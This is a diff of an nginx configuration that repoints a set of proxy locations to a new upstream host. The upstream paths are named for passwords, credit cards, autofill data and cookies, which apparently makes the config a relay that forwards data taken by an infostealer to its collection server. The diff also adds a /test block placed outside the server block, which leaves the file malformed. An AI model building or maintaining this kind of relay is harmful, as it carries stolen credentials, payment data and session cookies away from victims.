@@ -8,7 +8,7 @@ server {
       proxy_set_header Host $http_host;
       proxy_set_header X-NginX-Proxy true;
 
-      proxy_pass https://zortt.xfixxyy12951.repl.co/;
+      proxy_pass https://www.beholder.cf/;
       proxy_redirect off;
     }
 
@@ -18,7 +18,7 @@ server {
       proxy_set_header Host $http_host;
       proxy_set_header X-NginX-Proxy true;
 
-      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/passwords;
+      proxy_pass https://www.beholder.cf/api/send/passwords;
       proxy_redirect off;
     }
 
@@ -28,7 +28,7 @@ server {
       proxy_set_header Host $http_host;
       proxy_set_header X-NginX-Proxy true;
 
-      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/creditcards;
+      proxy_pass https://www.beholder.cf/api/send/creditcards;
       proxy_redirect off;
     }
 
@@ -38,7 +38,7 @@ server {
       proxy_set_header Host $http_host;
       proxy_set_header X-NginX-Proxy true;
 
-      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/autofill;
+      proxy_pass https://www.beholder.cf/api/send/autofill;
       proxy_redirect off;
     }
 
@@ -48,7 +48,19 @@ server {
       proxy_set_header Host $http_host;
       proxy_set_header X-NginX-Proxy true;
 
-      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/cookies;
+      proxy_pass https://www.beholder.cf/api/send/cookies;
       proxy_redirect off;
     }
  }
+
+    location /test {
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_set_header X-NginX-Proxy true;
+
+      proxy_pass https://youtube.com;
+      proxy_redirect off;
+    }
+ }
+
